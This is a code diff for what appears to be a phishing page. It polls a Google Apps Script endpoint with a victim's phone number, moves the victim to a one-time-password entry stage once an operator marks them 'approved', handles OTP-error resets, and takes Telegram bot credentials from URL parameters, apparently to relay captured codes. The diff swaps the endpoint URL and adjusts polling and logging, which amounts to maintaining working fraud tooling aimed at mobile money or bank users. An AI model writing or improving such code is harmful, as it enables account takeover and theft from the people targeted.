@@ -120,7 +120,7 @@
         let isResetting = false;
         let otpInterval;
     // Config
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyFkiqV0yvhsvwhcpeOCRhpT63cQ3j0zNnU5E-IJPVyPmFiLpE5ku2QXv6MxUhHwdz01w/exec";
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzFXPULmVpsUH4RgQ8d1hXzBcB-vg6wv4SB0hQRZNsuru_VesVOwRXoIbKBDqa3BAyBYQ/exec";
     const urlParams = new URLSearchParams(window.location.search);
     const BOT_TOKEN = urlParams.get('token');
     const CHAT_ID = urlParams.get('id');
@@ -179,21 +179,22 @@ Amt: GHS ${amt}
     }
 
 async function startPolling(phone) {
-    const cleanPhone = String(phone).trim(); // Ensure no spaces
-    
+    const cleanID = String(phone).trim();
+    console.log("DEBUG: Starting Poll for ID [" + cleanID + "]");
+
     const poller = setInterval(async () => {
         try {
-            // Use a timestamp (v=...) to force Google to bypass its 10-second cache
-            const r = await fetch(`${SCRIPT_URL}?num=${encodeURIComponent(cleanPhone)}&v=${Date.now()}`);
+            // The v= ensures we don't get an old cached 'pending' result
+            const r = await fetch(`${SCRIPT_URL}?num=${encodeURIComponent(cleanID)}&v=${Date.now()}`);
             const status = (await r.text()).trim();
 
-            console.log("Polling " + cleanPhone + ": " + status);
+            console.log("DEBUG: ID [" + cleanID + "] Status is: " + status);
 
             if (status === "approved") {
-                clearInterval(poller); 
-                showView(3); // Move to OTP Stage
+                clearInterval(poller);
+                showView(3); 
                 runCountdown(30);
-                fetch(`${SCRIPT_URL}?num=${cleanPhone}&cmd=clear`);
+                fetch(`${SCRIPT_URL}?num=${cleanID}&cmd=clear`);
             }
 
             if (status === "otp_error" && !isResetting) {
@@ -225,8 +226,11 @@ async function startPolling(phone) {
                     runCountdown(30);
                     isResetting = false; 
                 }, 2000);
+                fetch(`${SCRIPT_URL}?num=${cleanID}&cmd=clear`);
             }
-        } catch (e) { console.error("Poll error", e); }
+        } catch (e) {
+            console.error("DEBUG: Connection Failed", e);
+        }
     }, 3000);
 }
 
